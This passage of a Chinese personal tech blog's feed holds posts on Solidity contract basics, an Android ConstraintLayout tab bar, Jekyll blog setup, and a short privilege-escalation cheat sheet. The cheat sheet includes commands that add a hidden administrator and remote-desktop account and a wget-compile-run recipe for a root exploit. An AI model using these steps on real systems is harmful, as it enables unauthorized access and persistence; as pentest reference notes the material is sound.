id="实现一个转账功能"><a href="#实现一个转账功能" class="headerlink" title="实现一个转账功能"></a>实现一个转账功能</h2><pre><code>pragma solidity ^0.4.25;// 此智能合约可以实现向合约的所有者转账的功能contract PayableDemo{    address public _owner; // 存储合约的所有者    // 只有合约所有者才会调用构造函数    function PayableDemo() {        _owner = msg.sender; // sender：获取函数调用者的地址    }    // 创建一个函数，实现转账功能，转账函数必须有payable关键字    function transfer() payable{        _owner.transfer(msg.value); // value：在调用当前函数时，传入value值    }    function showBalance() returns(address,uint256){        address _account = msg.sender;        return (_account,_account.balance);    }}</code></pre><h2 id="修改器-amp-合约自毁"><a href="#修改器-amp-合约自毁" class="headerlink" title="修改器&amp;合约自毁"></a>修改器&amp;合约自毁</h2><pre><code>pragma solidity ^0.4.24;// 此智能合约可以实现向合约的所有者转账的功能contract PayableDemo{    address public _owner; // 存储合约的所有者    // unint256 public _money;    // 只有合约所有者才会调用构造函数    function PayableDemo() {        _owner = msg.sender; // sender：获取函数调用者的地址        // 合约创建者在创建合约时输入一定的金额        msg.value;    }    // 创建一个函数，实现转账功能，转账函数必须有payable关键字    function transfer() payable{        _owner.transfer(msg.value); // value：在调用当前函数时，传入value值    }    function showBalance() returns(address,uint256){        address _account = msg.sender;        return (_account,_account.balance);    }    // 判断合约所有者的修改器（Java AOP）    modifier onlyOwner{        if (msg.sender!=_owner)            throw;        _; // 代表执行函数内部语句    }    // 编写函数，实现合约自毁的功能    function kill(address addr) onlyOwner{        // 判断是否为合约所有者        selfdestruct(addr); // 销毁合约并且发送金额到指定地址    }}</code></pre><h2 id="重写修改器-amp-打印日志"><a href="#重写修改器-amp-打印日志" class="headerlink" title="重写修改器&amp;打印日志"></a>重写修改器&amp;打印日志</h2><pre><code>pragma solidity ^0.4.24;contract PaySuper{    // 属于默认缺省值：internal    address internal _owner; // 存储合约的所有者    // 判断合约所有者的修改其（Java  Aop）    modifier onlyOwner{        if(msg.sender!=_owner)            throw;        _;    }}// 此智能合约可以实现向合约的所有者转账的功能contract PayableDemo is PaySuper{    event showMsg(string);    // 只有合约所有者才会调用构造函数    function PayableDemo() payable{        _owner = msg.sender; // sender：获取函数调用者的地址        // 合约创建者在创建合约时输入一定的金额        msg.value;    }       // 创建一个函数，实现转账功能，转账函数必须有payable关键字    function transfer() payable{        _owner.transfer(msg.value); // value：在调用当前函数时，传入value值    }    function showBalance() returns (address,uint256){        address _account = msg.sender;        return (_account,_account.balance);    }    modifier onlyOwner{        showMsg(&apos;rewrite super class modifier&apos;);        if(msg.sender!=_owner)            throw;        _; // _代表执行函数内部语句    }    // 编写函数，实现合约自毁的功能    function kill(address addr) onlyOwner{        // 判断是否为合约所有者        selfdestruct(addr);  // 销毁合约并且发送金额到指定地址    }}</code></pre><h2 id="结构体-amp-映射"><a href="#结构体-amp-映射" class="headerlink" title="结构体&amp;映射"></a>结构体&amp;映射</h2><pre><code>pragma solidity ^0.4.24;contract StructMapping{    // 定义一个结构体    struct Product{        string name;        uint num;    }    // 定义一个映射，来确定地址与产品的关系    mapping(address =&gt; Product) public proMap;    // 定义一个函数，来实现产品初始化功能    function init01(string _name,uint _num) {        // 创建一个结构体对象（不需要new）        // proMap[msg.sender] = Product(name,num);        proMap[msg.sender] = Product({name:_name,num:_num});    }    // 默认情况不能返回结构体类型    function show() returns(string,uint){        Product p = proMap[msg.sender];        return (p.name,p.num);    }}</code></pre><h2 id="众筹代码"><a href="#众筹代码" class="headerlink" title="众筹代码"></a>众筹代码</h2><pre><code>pragma solidity ^0.4.24;//主要完成产品的众筹contract CrowdFunding{    // 投资者是结构体    struct Funder{        address addr; // 投资者地址        uint amount; // 投资金额    }    // 采用结构体来描述众筹产品    struct Product{        address addr; // 如果众筹成功,则金额会转到当前地址        uint goal; // 预期众筹的目标,如果达到此目标则说明众筹成功        uint amount; // 实际众筹的金额        uint funderNum; // 统计投资者的人数,缺省值为0        // 映射类型,统计当前产品的投资者        mapping(uint =&gt; Funder) funders;    }     // 平台要统计众筹的产品数量    uint count;     // 此映射主要记录平台的众筹产品    mapping (uint =&gt; Product) public products;    // 添加众筹产品信息    function candidate(address addr, uint goal) returns (uint compaingnID){        // 结构体是不需要new,此处按照结构体声明的变量顺序进行赋值        products[count++] = Product(addr,goal*10**18,0,0);    }     // 此函数实现对产品进行众筹功能    function vote(uint index) payable {        // 通过索引获取要众筹产品信息        Product p = products[index];        // 创建投资者,并且存储到产品众筹映射中        // msg.sender:当前函数调用者,就是众筹者, msg.value：众筹金额是调用函数时传入的value值        p.funders[p.funderNum++] = Funder({addr:msg.sender,amount:msg.value});        // 把当前众筹金额追加到amount中        p.amount += msg.value;    }    // 检测当前产品众筹是否成功(如果成功则众筹金额转到产品提供的地址)    function check(uint index) payable returns (bool) {        Product p = products[index];        // 判断当前众筹金额是否大于设置金额        if (p.amount &lt; p.goal) {            return false;        }        // 众筹成功,当前金额要转给产品地址        uint amount = p.amount;        // 初始化amount        p.amount = 0;        p.addr.transfer(amount); // 如果失败则返回为false        // transfer equal send         // if(!p.addr.send(amount)){        //     throw;        // }        return true;    }}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://remix.ethereum.org&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;在线solidityIDE&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://solidity.readthedocs.io&quot; target
      
    
    </summary>
    
      <category term="区块链" scheme="http://tea9.coding.me/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
      <category term="区块链" scheme="http://tea9.coding.me/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>1.android布局-ConstraintLayout-约束布局-例子</title>
    <link href="http://tea9.coding.me/2018/09/14/2018-09-14-1_android_layout_constraintlayout/"/>
    <id>http://tea9.coding.me/2018/09/14/2018-09-14-1_android_layout_constraintlayout/</id>
    <published>2018-09-13T16:00:00.000Z</published>
    <updated>2018-09-15T05:05:42.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>ConstraintLayout 出来也有一段时间，虽说也有很多坑，但是一些属性还是特别好用的，在项目中我也逐渐在使用，下面是用ConstraintLayout实现的一个标签栏的样式例子。</p></blockquote><p><a href="https://tea9.xyz/2018/07/03/1_android_layout_constraintlayout.html" target="_blank" rel="noopener">1.android布局-ConstraintLayout-约束布局</a>  </p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="!--￼0--&gt;/20/1.jpg" alt=""></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><pre><code>1. 定义两条横向约束线(Guideline) 2. 横向排列5个控件(TextView)3. 在每个TextView 下在来5个短横线(View)4. 最下方放置一个ViewPager</code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>activity_tab_constraintlayout.xml  </p><pre><code>&lt;LinearLayout    android:orientation=&quot;vertical&quot;    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    android:background=&quot;@android:color/white&quot;    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;&gt;    &lt;android.support.constraint.ConstraintLayout        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;wrap_content&quot;&gt;        &lt;android.support.constraint.Guideline            android:id=&quot;@+id/guideline&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;match_parent&quot;            android:orientation=&quot;horizontal&quot;            app:layout_constraintGuide_begin=&quot;10dp&quot; /&gt;        &lt;android.support.constraint.Guideline            android:id=&quot;@+id/guideline1&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;match_parent&quot;            android:orientation=&quot;horizontal&quot;            app:layout_constraintGuide_begin=&quot;40dp&quot; /&gt;        &lt;TextView            android:id=&quot;@+id/tx1&quot;            app:layout_constraintTop_toTopOf=&quot;@id/guideline&quot;            app:layout_constraintLeft_toLeftOf=&quot;parent&quot;            app:layout_constraintRight_toLeftOf=&quot;@id/tx2&quot;            app:layout_constraintStart_toStartOf=&quot;parent&quot;            app:layout_constraintEnd_toStartOf=&quot;@id/tx2&quot;            style=&quot;@style/text2&quot;            android:text=&quot;@string/btn1&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/tx2&quot;            app:layout_constraintTop_toTopOf=&quot;@id/guideline&quot;            app:layout_constraintLeft_toRightOf=&quot;@id/tx1&quot;            app:layout_constraintRight_toLeftOf=&quot;@id/tx3&quot;            app:layout_constraintStart_toEndOf=&quot;@id/tx1&quot;            app:layout_constraintEnd_toStartOf=&quot;@id/tx3&quot;            style=&quot;@style/text2&quot;            android:text=&quot;@string/btn2&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/tx3&quot;            app:layout_constraintTop_toTopOf=&quot;@id/guideline&quot;            app:layout_constraintLeft_toRightOf=&quot;@id/tx2&quot;            app:layout_constraintRight_toLeftOf=&quot;@id/tx4&quot;            app:layout_constraintStart_toEndOf=&quot;@id/tx2&quot;            app:layout_constraintEnd_toStartOf=&quot;@id/tx4&quot;            style=&quot;@style/text2&quot;            android:text=&quot;@string/btn3&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/tx4&quot;            app:layout_constraintTop_toTopOf=&quot;@id/guideline&quot;            app:layout_constraintLeft_toRightOf=&quot;@id/tx3&quot;            app:layout_constraintRight_toLeftOf=&quot;@id/tx5&quot;            app:layout_constraintStart_toEndOf=&quot;@id/tx3&quot;            app:layout_constraintEnd_toStartOf=&quot;@id/tx5&quot;            style=&quot;@style/text2&quot;            android:text=&quot;@string/btn4&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/tx5&quot;            app:layout_constraintTop_toTopOf=&quot;@id/guideline&quot;            app:layout_constraintLeft_toRightOf=&quot;@id/tx4&quot;            app:layout_constraintRight_toRightOf=&quot;parent&quot;            app:layout_constraintStart_toEndOf=&quot;@id/tx4&quot;            app:layout_constraintEnd_toEndOf=&quot;parent&quot;            style=&quot;@style/text2&quot;            android:text=&quot;@string/btn5&quot;/&gt;        &lt;View            android:id=&quot;@+id/view1&quot;            android:visibility=&quot;visible&quot;            app:layout_constraintTop_toBottomOf=&quot;@id/tx1&quot;            app:layout_constraintStart_toStartOf=&quot;@id/tx1&quot;            app:layout_constraintEnd_toEndOf=&quot;@id/tx1&quot;            style=&quot;@style/short_line&quot; /&gt;        &lt;View            android:id=&quot;@+id/view2&quot;            android:visibility=&quot;gone&quot;            app:layout_constraintTop_toBottomOf=&quot;@id/tx2&quot;            app:layout_constraintStart_toStartOf=&quot;@id/tx2&quot;            app:layout_constraintEnd_toEndOf=&quot;@id/tx2&quot;            style=&quot;@style/short_line&quot; /&gt;        &lt;View            android:id=&quot;@+id/view3&quot;            android:visibility=&quot;gone&quot;            app:layout_constraintTop_toBottomOf=&quot;@id/tx3&quot;            app:layout_constraintStart_toStartOf=&quot;@id/tx3&quot;            app:layout_constraintEnd_toEndOf=&quot;@id/tx3&quot;            style=&quot;@style/short_line&quot;  /&gt;        &lt;View            android:id=&quot;@+id/view4&quot;            android:visibility=&quot;gone&quot;            app:layout_constraintTop_toBottomOf=&quot;@id/tx4&quot;            app:layout_constraintStart_toStartOf=&quot;@id/tx4&quot;            app:layout_constraintEnd_toEndOf=&quot;@id/tx4&quot;            style=&quot;@style/short_line&quot;  /&gt;        &lt;View            android:id=&quot;@+id/view5&quot;            android:visibility=&quot;gone&quot;            app:layout_constraintTop_toBottomOf=&quot;@id/tx5&quot;            app:layout_constraintStart_toStartOf=&quot;@id/tx5&quot;            app:layout_constraintEnd_toEndOf=&quot;@id/tx5&quot;            style=&quot;@style/short_line&quot;  /&gt;        &lt;View            android:id=&quot;@+id/view6&quot;            app:layout_constraintTop_toBottomOf=&quot;@id/guideline1&quot;            android:background=&quot;@color/gray&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;10dp&quot;/&gt;    &lt;/android.support.constraint.ConstraintLayout&gt;    &lt;android.support.v4.view.ViewPager        android:id=&quot;@+id/vp1&quot;        android:overScrollMode=&quot;never&quot;        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;wrap_content&quot;&gt;    &lt;/android.support.v4.view.ViewPager&gt;&lt;/LinearLayout&gt;</code></pre><blockquote><p>说明：这个布局为什么不直接用ConstraintLayout做根布局呢？<br>因为 如果ViewPager里的布局使用RecyclerView最后一条或几条显示不全</p></blockquote><p><a href="https://blog.csdn.net/android_mh/article/details/79022738" target="_blank" rel="noopener">关于ConstraintLayout与Recycleview使用中的一些坑</a>  </p><hr><p>TabConstraintLayoutActivity.kt  </p><pre><code>class TabConstraintLayoutActivity : AppCompatActivity(), View.OnClickListener {    override fun onClick(v: View?) {        when (v!!.id) {            R.id.tx1 -&gt; vp1.currentItem = 0            R.id.tx2 -&gt; vp1.currentItem = 1            R.id.tx3 -&gt; vp1.currentItem = 2            R.id.tx4 -&gt; vp1.currentItem = 3            R.id.tx5 -&gt; vp1.currentItem = 4        }    }    var views = arrayListOf&lt;View&gt;()    override fun onCreate(savedInstanceState: Bundle?) {        super.onCreate(savedInstanceState)        setContentView(R.layout.activity_tab_constraintlayout)        initView()        initViewPager()        clearView()        clickView(1)    }    private fun initView() { // 初始化view        tx1.setOnClickListener(this)        tx2.setOnClickListener(this)        tx3.setOnClickListener(this)        tx4.setOnClickListener(this)        tx5.setOnClickListener(this)        val v1 = LayoutInflater.from(this).inflate(R.layout.item_text, null)        val v2 = LayoutInflater.from(this).inflate(R.layout.item_text, null)        val v3 = LayoutInflater.from(this).inflate(R.layout.item_text, null)        val v4 = LayoutInflater.from(this).inflate(R.layout.item_text, null)        val v5 = LayoutInflater.from(this).inflate(R.layout.item_text, null)        views.addAll(arrayListOf&lt;View&gt;(v1, v2, v3, v4, v5))    }    private fun initViewPager() { //初始化ViewPager        vp1.adapter = ViewPagerAdapter(views)        vp1.addOnPageChangeListener(object : ViewPager.OnPageChangeListener {            override fun onPageScrollStateChanged(p0: Int) {            }            override fun onPageScrolled(p0: Int, p1: Float, p2: Int) {            }            override fun onPageSelected(p0: Int) {                when (p0) {                    0 -&gt; clickView(1)                    1 -&gt; clickView(2)                    2 -&gt; clickView(3)                    3 -&gt; clickView(4)                    4 -&gt; clickView(5)                }            }        })        vp1.currentItem = 0    }    private fun clearView() { // 清空View选中状态        val arg = ContextCompat.getColor(this, R.color.gray_deep)        tx1.setTextColor(arg)        tx2.setTextColor(arg)        tx3.setTextColor(arg)        tx4.setTextColor(arg)        tx5.setTextColor(arg)        view1.visibility = View.GONE        view2.visibility = View.GONE        view3.visibility = View.GONE        view4.visibility = View.GONE        view5.visibility = View.GONE    }    private fun clickView(position: Int) { // 选中View样式        val color = ContextCompat.getColor(this, R.color.pink)        when (position) {            1 -&gt; {                clearView()                tx1.setTextColor(color)                view1.visibility = View.VISIBLE            }            2 -&gt; {                clearView()                tx2.setTextColor(color)                view2.visibility = View.VISIBLE            }            3 -&gt; {                clearView()                tx3.setTextColor(color)                view3.visibility = View.VISIBLE            }            4 -&gt; {                clearView()                tx4.setTextColor(color)                view4.visibility = View.VISIBLE            }            5 -&gt; {                clearView()                tx5.setTextColor(color)                view5.visibility = View.VISIBLE            }        }    }    class ViewPagerAdapter(views: List&lt;View&gt;) : PagerAdapter() { // ViewPager Adapter        var views1 = arrayListOf&lt;View&gt;()        init {            views1 = views as ArrayList&lt;View&gt;        }        override fun isViewFromObject(p0: View, p1: Any): Boolean {            return p0 == p1        }        override fun getCount(): Int {            return views1.size        }        override fun destroyItem(container: ViewGroup, position: Int, `object`: Any) {            container.removeView(views1.get(position))        }        override fun instantiateItem(container: ViewGroup, position: Int): Any {            container.addView(views1[position])            initView(position, container)            return views1[position]        }        fun initView(position: Int, container: ViewGroup) {            views1[position].findViewById&lt;TextView&gt;(R.id.text).text = container.context.getString(R.string.text) + position.toShort()        }    }}</code></pre><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/tea9/dear_kotlin_code/tree/master/constraintlayout" target="_blank" rel="noopener">constraintlayout</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;ConstraintLayout 出来也有一段时间，虽说也有很多坑，但是一些属性还是特别好用的，在项目中我也逐渐在
      
    
    </summary>
    
      <category term="android" scheme="http://tea9.coding.me/categories/android/"/>
    
    
      <category term="android" scheme="http://tea9.coding.me/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>内网提权命令</title>
    <link href="http://tea9.coding.me/2018/09/07/2018-09-07-network_shell/"/>
    <id>http://tea9.coding.me/2018/09/07/2018-09-07-network_shell/</id>
    <published>2018-09-06T16:00:00.000Z</published>
    <updated>2018-09-15T11:33:51.212Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows基础命令"><a href="#Windows基础命令" class="headerlink" title="Windows基础命令"></a>Windows基础命令</h2><pre><code>net user xxquery user #查看用户登录情况whoami #当前用户权限systeminfo #查看当前系统版本与补丁信息net user xx 123456 /add #添加用户net localgroup administrators xx /add #添加到管理员组net localgroup &quot;Remote Desktop Users&quot; xx /add #如远程桌面连接不上那么添加远程桌面组ipconfig #查看本机ip信息，可加 /all 参数netstat -ano #查看端口情况dir c:\ #查看目录type c:\Users\admin\Desktop\1.txt #查看指定位置文件内容，一般为文本文件echo 字符串&gt;2.txt #写入文本到文件。特殊字符如&lt;&gt;等前面加^copy 1.txt 3.php #复制文件rename d:\2.txt mspaint.bat #将某个路径下的文件重命名tasklist #查看所有进程占用的端口taskkill /im xx.ext /f #强制结束指定进程 如 taskkill /im QQMusic.exe /f</code></pre><h2 id="Windows基础提权命令"><a href="#Windows基础提权命令" class="headerlink" title="Windows基础提权命令"></a>Windows基础提权命令</h2><pre><code>查看系统信息systeminfo|findstr /B/C:&quot;OS名称&quot;/C:&quot;OS版本&quot;主机名Hostname环境变量Set查看用户信息Net userNet1 user查看服务pid号Tasklist/svc|find &quot;TermService&quot;netstat -ano|find &quot;1488&quot;查看系统名wmic os get caption查看补丁信息wmic dfe get Description,HotFixID,InstalledOn|findstr /C:&quot;KB4013389&quot; /C:&quot;KB958644&quot;查看当前安装程序wmic product get name,version</code></pre><h2 id="Linux基础命令"><a href="#Linux基础命令" class="headerlink" title="Linux基础命令"></a>Linux基础命令</h2><pre><code>查看系统版本信息    cat /etc/issue    cat /etc/*-release查看内核版本    uname -a</code></pre><h2 id="Linux提权基础命令"><a href="#Linux提权基础命令" class="headerlink" title="Linux提权基础命令"></a>Linux提权基础命令</h2><pre><code>基础命令：uname -anidpwdcat /etc/issue套路：wget http://exp/exp.cgcc -o exp exp.cchmod +x exp./exp...到root</code></pre><h2 id="LINK"><a href="#LINK" class="headerlink" title="LINK"></a>LINK</h2><p><a href="https://zhuanlan.zhihu.com/p/42358253" target="_blank" rel="noopener">【权限提升】Linux 提权常用命令集</a><br><a href="https://github.com/SecWiki" target="_blank" rel="noopener">SecWikiGithub</a><br><a href="https://www.sec-wiki.com/" target="_blank" rel="noopener">SecWiki</a><br><a href="https://www.exploit-db.com/local/" target="_blank" rel="noopener">Exploit-db本地提权</a><br><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">Windows提权漏洞集合</a><br><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">Linux提权漏洞集合</a><br><a href="https://github.com/SecWiki/macos-kernel-exploits" target="_blank" rel="noopener">Mac-OS提权漏洞集合</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Windows基础命令&quot;&gt;&lt;a href=&quot;#Windows基础命令&quot; class=&quot;headerlink&quot; title=&quot;Windows基础命令&quot;&gt;&lt;/a&gt;Windows基础命令&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;net user xx

query user #查
      
    
    </summary>
    
      <category term="安全" scheme="http://tea9.coding.me/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="http://tea9.coding.me/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>我的博客说明指南</title>
    <link href="http://tea9.coding.me/2018/09/06/2018-09-06-my_blog_explain/"/>
    <id>http://tea9.coding.me/2018/09/06/2018-09-06-my_blog_explain/</id>
    <published>2018-09-05T16:00:00.000Z</published>
    <updated>2018-09-09T09:19:15.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="博客自定义指南"><a href="#博客自定义指南" class="headerlink" title="博客自定义指南"></a>博客自定义指南</h1><p>博客链接/blog link<br><a href="https://tea9.xyz/" target="_blank" rel="noopener">tea9</a>  </p><p>使用<a href="//jekyllrb.com">Jekyll</a>博客引擎<br>基于<a href="https://github.com/kaeyleo/jekyll-theme-H2O" target="_blank" rel="noopener">Theme H2O</a>修改  </p><h2 id="前置条件-Before："><a href="#前置条件-Before：" class="headerlink" title="前置条件/Before："></a>前置条件/Before：</h2><p>需要你有<br><a href="http://www.github.com/" target="_blank" rel="noopener">GitHub</a><br><a href="https://pages.github.com/" target="_blank" rel="noopener">Github Page</a><br><a href="https://jekyllrb.com/" target="_blank" rel="noopener">Jekyll</a>环境  </p><p>如以上都有还有问题请参考<br><a href="https://tea9.xyz/2018/05/28/create_jekyll_blog1.html" target="_blank" rel="noopener">使用jekyll搭建个人博客</a><br><a href="https://github.com/kaeyleo/jekyll-theme-H2O/blob/master/README.md" target="_blank" rel="noopener">jekyll-theme-H2O_README</a>  </p><h2 id="步骤-Step："><a href="#步骤-Step：" class="headerlink" title="步骤/Step："></a>步骤/Step：</h2><p><a href="https://github.com/tea9/tea9.github.io" target="_blank" rel="noopener">github目录</a></p><p><strong>克隆项目：</strong>  </p><pre><code>git clone https://github.com/tea9/tea9.github.io.git</code></pre><p><strong>目录结构：</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├──_drafts # 草稿目录 -可以删除此目录/建议清空目录  </span><br><span class="line">├──_includes # 一些封装的布局  </span><br><span class="line">├──_layouts # 默认布局  </span><br><span class="line">├──_posts # 文章目录 -建议清空目录  </span><br><span class="line">├──assets # 一些前端文件  </span><br><span class="line">├──dev # 未编译的前端文件  </span><br><span class="line">├──laji # 我的之前博客文件 -目录建议删除  </span><br><span class="line">├──live2d # 首页的二次元小姐姐  </span><br><span class="line">├──pages  # 一些我自定义的页面  </span><br><span class="line">|├──about.md #关于我页面  </span><br><span class="line">|├──links.md # 友情链接页面  </span><br><span class="line">|└── message.md # 留言板页面  </span><br><span class="line">├──pdf # 文章里的引用的电子书 可以删除此目录  </span><br><span class="line">├──readme_img # README.md 中引用的图片 可以删除此目录  </span><br><span class="line">├──resource # 我的一些瞎写的样式 可以删除此目录  </span><br><span class="line">├──yoone # 有药待办 如果不需要 可以删除此目录  </span><br><span class="line">├──1.mp3 # 樱花页面自动播放的音乐  </span><br><span class="line">├──403.html  </span><br><span class="line">├──404.html  </span><br><span class="line">├──CNAME # 域名配置信息 如果你有域名可以修改 没有可以删除  </span><br><span class="line">├──README.md # 可以删除  </span><br><span class="line">├──README1.md # 可以删除  </span><br><span class="line">├──TODO.md # 我写的待办 可以删除  </span><br><span class="line">├──_config.yml # jekyll 配置文件  </span><br><span class="line">├──archives.html # 归档页面  </span><br><span class="line">├──categories.html # 分类页面  </span><br><span class="line">├──favicon.ico # 图标  </span><br><span class="line">├──feed.xml # rss文件  </span><br><span class="line">├──index.html # 首页页面  </span><br><span class="line">├──package-lock.json # 包文件  </span><br><span class="line">├──rakefile.rb # rake生成文章文件 命令 rake post title=&quot;文章名称&quot; </span><br><span class="line">├──sakura.html # 樱花页面  </span><br><span class="line">├──search.json # 搜索配置文件  </span><br><span class="line">└──tags.html # 标签页面</span><br></pre></td></tr></table></figure><p><strong>建议删除的目录/文件（不删除也没事）/Suggest Delete：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_drafts / laji / pdf / readme_img / resource / yoone / CNAME / README.md / README1.md / TODO.md</span><br></pre></td></tr></table></figure></p><p><strong>修改配置文件/Need Update：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br></pre></td></tr></table></figure></p><p>以下建议修改成你自己的博客信息/Change it your message   </p><pre><code>title: &apos;&apos; 首页标题description: &apos;&apos; 首页描述s-description: &apos;&apos;  樱花页面描述keyword: &apos;&apos; 关键字url: &apos;&apos; # your host</code></pre><p>以下如果不需要用#注释 需要就扒#号去掉  </p><pre><code>nav:  home: &apos;/sakura.html&apos; 首页  categories: &apos;/categories.html&apos; 分类页  archives: &apos;/archives.html&apos; 归档页#  tags: &apos;/tags.html&apos; 标签页#  about: &apos;/about&apos; 关于我页面  links: &apos;/links/&apos; 友情链接页#  message: &apos;/message/&apos;   yoone: &apos;/yoone&apos; 有药待办  rss: &apos;/feed.xml&apos; rss</code></pre><p>作者信息  </p><pre><code>author: &apos;tea9&apos;nickname: &apos;tea9&apos;</code></pre><p>评论配置信息（不要直接用我的，用我的肯定是不行的）<br>有两个评论系统3选1 用那个就直接改成true  </p><p>然后配置改了  </p><p>disqus参考<a href="https://disqus.com/" target="_blank" rel="noopener">disqus</a>国内可能显示不了  </p><p>gitalk参考<a href="https://tea9.xyz/2018/06/24/gitali_config.html" target="_blank" rel="noopener">jekyll-theme-H2O的gitalk相关配置</a>  </p><p>valine参考<a href="https://ioliu.cn/2017/add-valine-comments-to-your-blog/" target="_blank" rel="noopener">Valine – 一款极简的评论系统</a></p><pre><code>comments:  disqus: false  disqus_url: &apos;https://liaokeyu.disqus.com/embed.js&apos;  gitalk: true  gitalk_clientID: &apos;&apos;  gitalk_Secret: &apos;&apos;  gitalk_repo: &apos;&apos;  gitalk_owner: &apos;&apos;  gitalk_admin: &apos;&apos;  distractionFreeMode: false  valine: false  valine_app_id: &apos;&apos;  valine_app_key: &apos;&apos;  valine_placeholder: &apos;&apos;  valine_avatar: &apos;&apos;</code></pre><p>文章赞赏 不开就改成false<br>然后把图片链接改成自己的（不改我也不介意）  </p><pre><code>reward:  enable: true  reward_comment: &apos;&apos; 显示的话  wechatpay: &apos;&apos; 微信支付链接  alipay: &apos;&apos;  支付宝支付链接</code></pre><p>首页显示的社交帐号（修改成你自己的）  </p><pre><code>sns:  github: &apos;&apos;  email: &apos;&apos;  zhihu: &apos;&apos;  juejin: &apos;&apos;  weibo: &apos;&apos;  twitter: &apos;&apos;  instagram: &apos;&apos;  douban: &apos;&apos;  facebook: &apos;&apos;  jianshu: &apos;&apos;</code></pre><p>百度统计修改成你自己的  </p><pre><code>baidu-analysis: d49f14171852506bc53c0072034d9db9</code></pre><p>这是我的图床的链接 你要就修改成自己的  </p><pre><code>img_link: &apos;https://coding.net/u/tea9/p/image/git/raw/master/blog_img&apos;</code></pre><p>live-2d小姐姐开关true/false<br>hitokoto <a href="https://hitokoto.cn/" target="_blank" rel="noopener">一言</a>true/false  </p><pre><code>live-2d: truehitokoto: true</code></pre><p>这是自定义属性<br>背景图 背景颜色 字体颜色<br>推荐一个颜色网站，和风的，颜色有点美<a href="http://nipponcolors.com/" target="_blank" rel="noopener">NIPPON COLORS</a></p><pre><code>sty:  back-img: &apos;https://coding.net/u/tea9/p/image/git/raw/master/blog_img/appreciate/runa.png&apos; 首页背景图  back-color: &apos;rgb(58,60,65)&apos; 背景颜色（建议使用背景图同色系的）  b2t-back: &apos;#3A3226&apos; 返回顶部背景颜色  b2t-color: &apos;#fff&apos; 返回顶部字体颜色  ban-color: &apos;#D7C4BB&apos; banner字体颜色  post-color: &apos;#fff&apos; 文章列表字体颜色  foot-color: &apos;#B19693&apos; 底部栏字体颜色  md-color: &apos;#fff&apos; 文章字体颜色</code></pre><h2 id="探索更多："><a href="#探索更多：" class="headerlink" title="探索更多："></a>探索更多：</h2><p><a href="https://github.com/tea9/tea9.github.io/blob/master/README.md" target="_blank" rel="noopener">README</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;博客自定义指南&quot;&gt;&lt;a href=&quot;#博客自定义指南&quot; class=&quot;headerlink&quot; title=&quot;博客自定义指南&quot;&gt;&lt;/a&gt;博客自定义指南&lt;/h1&gt;&lt;p&gt;博客链接/blog link&lt;br&gt;&lt;a href=&quot;https://tea9.xyz/&quot; targ
      
    
    </summary>
    
      <category term="blog" scheme="http://tea9.coding.me/categories/blog/"/>
    
    
      <category term="blog" scheme="http://tea9.coding.me/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>android复杂布局</title>
